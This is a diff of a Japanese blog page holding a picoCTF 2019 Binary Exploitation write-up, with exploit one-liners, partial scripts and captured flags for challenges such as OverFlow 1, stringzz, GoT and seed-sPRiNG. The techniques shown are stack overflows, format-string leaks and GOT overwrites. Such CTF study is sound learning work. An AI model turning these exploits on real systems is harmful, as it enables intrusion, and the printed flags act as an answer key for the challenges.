@@ -48,7 +48,7 @@
 <meta itemprop="description" content="URL: https://2019game.picoctf.com/ 2週間、お疲れ様です。 最終結果は、こんな感じ。 イベント終了時点で、ユーザは4万人弱でした。 PwnとWeb系があんまりできてないけど、スコ">
 <meta itemprop="datePublished" content="2019-10-12T07:45:00&#43;09:00" />
 <meta itemprop="dateModified" content="2019-10-13T10:30:00&#43;09:00" />
-<meta itemprop="wordCount" content="2482">
+<meta itemprop="wordCount" content="2483">
 
 
 
@@ -195,26 +195,26 @@
 </div>
     <div class="post-content">
       <p>URL: <a href="https://2019game.picoctf.com/"><a href="https://2019game.picoctf.com/">https://2019game.picoctf.com/</a></a>
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 2週間、お疲れ様です。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<p><br /><br />
 最終結果は、こんな感じ。</p>
-<!-- raw HTML omitted -->
-<p><!-- raw HTML omitted -->
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Score.png" alt="pico2019_Score.png">
+<p><br />
 イベント終了時点で、ユーザは4万人弱でした。</p>
-<!-- raw HTML omitted -->
-<!-- raw HTML omitted -->
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Users.png" alt="pico2019_Users.png">
+<img src="https://captureamerica.github.io/writeups/img/pico2019_Rank.png" alt="pico2019_Rank.png">
 <p>PwnとWeb系があんまりできてないけど、スコアも切りのいい20000に行ったし、Globalで目標の300位以内 (283位) にも入れたのでかなり満足です。</p>
 <p>去年出た問題に似てるものも結構あったので、picoCTF 2018をそれなりにやった人は結構アドバンテージがあったと思います。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
+<p><br /><br />
 Binary Exploitation の Writeupです。</p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br /></p>
 <h1 id="binary-exploitation-handyshellcode-50-points">[Binary Exploitation]: handy-shellcode (50 points)</h1>
 <hr>
 <h2 id="challenge">Challenge</h2>
 <blockquote>
 <p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: You might be able to find some good shellcode online.</p>
 </blockquote>
 <p>Attachment:</p>
@@ -222,7 +222,7 @@ Hint: You might be able to find some good shellcode online.</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution">Solution</h2>
 <p>これは、picoCTF 2018のshellcodeと同じでした。</p>
 <div class="highlight"><div class="chroma">
@@ -246,16 +246,16 @@ Hint: You might be able to find some good shellcode online.</p>
 </code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-overflow-1-150-points">[Binary Exploitation]: OverFlow 1 (150 points)</h1>
 <hr>
 <h2 id="challenge1">Challenge</h2>
 <blockquote>
 <p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: Take control that return address
-<!-- raw HTML omitted -->
+<br />
 Hint: Make sure your address is in Little Endian.</p>
 </blockquote>
 <p>Attachment:</p>
@@ -263,7 +263,7 @@ Hint: Make sure your address is in Little Endian.</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution1">Solution</h2>
 <p>offsetを求めて、飛びたい関数に飛ぶだけ。</p>
 <pre><code>$ (python -c 'print(&quot;A&quot;*76+&quot;\xE6\x85\x04\x08&quot;)' ; cat - ) | ./vuln
@@ -271,14 +271,14 @@ Give me a string and lets see what happens:
 Woah, were jumping to 0x80485e6 !
 picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}
 </code></pre><p>Flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-newoverflow1-200-points">[Binary Exploitation]: NewOverFlow-1 (200 points)</h1>
 <hr>
 <h2 id="challenge2">Challenge</h2>
 <blockquote>
 <p>Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes</p>
 </blockquote>
 <p>Attachment:</p>
@@ -286,7 +286,7 @@ Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes</p>
 <li>vuln (ELF 64-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution2">Solution</h2>
 <p>picoCTFのサーバは、Ubuntu 18.04であるところがポイントです。16 byte alignmentしないと解けません。</p>
 <div class="highlight"><div class="chroma">
@@ -332,14 +332,14 @@ Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes</p>
 </code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_bfd48203}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-newoverflow2-250-points">[Binary Exploitation]: NewOverFlow-2 (250 points)</h1>
 <hr>
 <h2 id="challenge3">Challenge</h2>
 <blockquote>
 <p>Okay now lets try mainpulating arguments. program.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: Arguments aren't stored on the stack anymore ;)</p>
 </blockquote>
 <p>Attachment:</p>
@@ -347,18 +347,18 @@ Hint: Arguments aren't stored on the stack anymore ;)</p>
 <li>vuln (ELF 64-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution3">Solution</h2>
 <p>たぶん問題が間違っている気がします。win_fn1()とかいくつか関数が追加されているものの、flag()が残っているので、NewOverFlow-1と全く同じで解けます。</p>
 <p>Flag: <code>picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-overflow-2-250-points">[Binary Exploitation]: OverFlow 2 (250 points)</h1>
 <hr>
 <h2 id="challenge4">Challenge</h2>
 <blockquote>
 <p>Now try overwriting arguments. Can you get the flag from this program?
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: GDB can print the stack after you send arguments</p>
 </blockquote>
 <p>Attachment:</p>
@@ -366,7 +366,7 @@ Hint: GDB can print the stack after you send arguments</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution4">Solution</h2>
 <p>これはpicoCTF 2018のbof2とほぼ同じです。</p>
 <pre><code>$ (python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;BBBB&quot;+&quot;\xEF\xBE\xAD\xDE&quot;+&quot;\x0D\xD0\xDE\xC0&quot;)'; cat -) | ./vuln
@@ -374,14 +374,14 @@ Please enter your string:
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA???AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBﾭ?
 picoCTF{arg5_and_r3turn55897b905}
 </code></pre><p>Flag: <code>picoCTF{arg5_and_r3turn55897b905}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-canary-300-points">[Binary Exploitation]: CanaRy (300 points)</h1>
 <hr>
 <h2 id="challenge5">Challenge</h2>
 <blockquote>
 <p>This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: Maybe there's a smart way to brute-force the canary?</p>
 </blockquote>
 <p>Attachment:</p>
@@ -389,7 +389,7 @@ Hint: Maybe there's a smart way to brute-force the canary?</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution5">Solution</h2>
 <p>これはpicoCTF 2018のbof3とほぼ同じです。</p>
 <p>去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。</p>
@@ -398,14 +398,14 @@ Please enter the length of the entry:
 &gt; Input&gt; Ok... Now Where's the Flag?
 picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
 </code></pre><p>Flag: <code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-messymalloc-300-points">[Binary Exploitation]: messy-malloc (300 points)</h1>
 <hr>
 <h2 id="challenge6">Challenge</h2>
 <blockquote>
 <p>Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with nc 2019shell1.picoctf.com 21899.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: If only the program used calloc to zero out the memory..</p>
 </blockquote>
 <p>Attachment:</p>
@@ -413,7 +413,7 @@ Hint: If only the program used calloc to zero out the memory..</p>
 <li>auth (ELF 64-bit)</li>
 <li>auth.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution6">Solution</h2>
 <p>GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、ちょっと動きが違ってました（うろ覚え）。</p>
 <p>あと、recvuntil()辺りが思ったように動かなくて Invalid option になっちゃったりしたので、よくわかんないけど Invalid になった際には再トライするようにして対処しました。</p>
@@ -530,14 +530,14 @@ Hint: If only the program used calloc to zero out the memory..</p>
 </code></pre></td></tr></table>
 </div>
 </div><p>Flag: <code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ac0e0e6a}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-stringzz-300-points">[Binary Exploitation]: stringzz (300 points)</h1>
 <hr>
 <h2 id="challenge7">Challenge</h2>
 <blockquote>
 <p>Use a format string to pwn this program and get a flag.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf">http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/Format_String.pdf</a></p>
 </blockquote>
 <p>Attachment:</p>
@@ -545,7 +545,7 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution7">Solution</h2>
 <p>書式文字列攻撃の問題です。</p>
 <div class="highlight"><div class="chroma">
@@ -598,7 +598,7 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
         <span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>        
 </code></pre></td></tr></table>
 </div>
-</div><p><!-- raw HTML omitted -->
+</div><p><br />
 37番目に出てくるので、%37$s 入れるだけでもフラグは取れます。</p>
 <pre><code>$ ./vuln 
 input whatever string you want; then it will be printed back:
@@ -610,28 +610,28 @@ will be printed:
 
 picoCTF{str1nG_CH3353_159c98a8}
 </code></pre><p>Flag: <code>picoCTF{str1nG_CH3353_159c98a8}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-got-350-points">[Binary Exploitation]: GoT (350 points)</h1>
 <hr>
 <h2 id="challenge8">Challenge</h2>
 <blockquote>
 <p>You can only change one address, here is the problem: program.
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<br /><br /></p>
 </blockquote>
 <p>Attachment:</p>
 <ul>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <pre><code>$ checksec vuln
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      No PIE (0x8048000)   &lt;---
-</code></pre><p><!-- raw HTML omitted --></p>
+</code></pre><p><br /></p>
 <h2 id="solution8">Solution</h2>
 <pre><code>gef➤  x win
 0x80485c6 &lt;win&gt;:	0x53e58955
@@ -649,7 +649,7 @@ Dump of assembler code for function exit@plt:
    0x08048466 &lt;+6&gt;:	push   0x20
    0x0804846b &lt;+11&gt;:	jmp    0x8048410
 </code></pre><p>0x804a01cを、0x80485c6 (win)に書き換えればOK。</p>
-<p><!-- raw HTML omitted -->
+<p><br />
 10進数で入力します。</p>
 <pre><code>$ ./vuln 
 You can just overwrite an address, what can you do?
@@ -664,14 +664,14 @@ The following line should print the flag
 
 picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}
 </code></pre><p>Flag: <code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-pointy-350-points">[Binary Exploitation]: pointy (350 points)</h1>
 <hr>
 <h2 id="challenge9">Challenge</h2>
 <blockquote>
 <p>Exploit the function pointers in this program.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
+<br /><br />
 Hint : A function pointer can be used to call any function</p>
 </blockquote>
 <p>Attachment:</p>
@@ -679,7 +679,7 @@ Hint : A function pointer can be used to call any function</p>
 <li>vuln (ELF 32-bit)</li>
 <li>vuln.c</li>
 </ul>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <h2 id="solution9">Solution</h2>
 <p>2つ構造体が違うのに、同じポインタのリストを使っているところがポイント。</p>
 <div class="highlight"><div class="chroma">
@@ -707,7 +707,7 @@ Hint : A function pointer can be used to call any function</p>
 </code></pre></td></tr></table>
 </div>
 </div><p>ProfessorのlastScoreにアドレスを入れて、Student構造体としてアクセスさせます。</p>
-<p><!-- raw HTML omitted --></p>
+<p><br /></p>
 <pre><code>$ ./vuln 
 Input the name of a student
 aaa
@@ -734,23 +734,23 @@ Input the score:
 100
 picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
 </code></pre><p>Flag: <code>picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <h1 id="binary-exploitation-seedspring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</h1>
 <hr>
 <h2 id="challenge10">Challenge</h2>
 <blockquote>
 <p>The most revolutionary game is finally available: seed sPRiNG is open right now! seed_spring. Connect to it with nc 2019shell1.picoctf.com 12269.
-<!-- raw HTML omitted --><!-- raw HTML omitted -->
-Hints: <!-- raw HTML omitted -->
-How is that program deciding what the height is?<!-- raw HTML omitted -->
-You and the program should sync up!<!-- raw HTML omitted --></p>
+<br /><br />
+Hints: <br />
+How is that program deciding what the height is?<br />
+You and the program should sync up!<br /></p>
 </blockquote>
 <p>Attachment:</p>
 <ul>
 <li>seed_spring (ELF 32-bit)</li>
 </ul>
-<p><!-- raw HTML omitted -->
+<p><br />
 実行例：</p>
 <pre><code># ./seed_spring 
                                                                              
@@ -769,7 +769,7 @@ LEVEL (1/30)
 
 Guess the height: 2
 WRONG! Sorry, better luck next time!
-</code></pre><p><!-- raw HTML omitted --></p>
+</code></pre><p><br /></p>
 <h2 id="solution10">Solution</h2>
 <p>ランダムのシードをどこから取っているか、GDBとかGhidraとかで確認します。</p>
 <p>現在時間をベースにしているようです。</p>
@@ -830,11 +830,11 @@ WRONG! Sorry, better luck next time!
 <pre><code>$ ./seed_spring_solve.o ; nc 2019shell1.picoctf.com 12269
 </code></pre><p>あとは出てきた値を1つずつ入れるだけです。</p>
 <p>Flag: <code>picoCTF{pseudo_random_number_generator_not_so_random_66aacad47c332de30eb8d8170d96b772}</code></p>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 <hr>
-<p><!-- raw HTML omitted --><!-- raw HTML omitted -->
-<!-- raw HTML omitted --><!-- raw HTML omitted --></p>
+<p><br /><br />
+<br /><br /></p>
 
     </div>
 
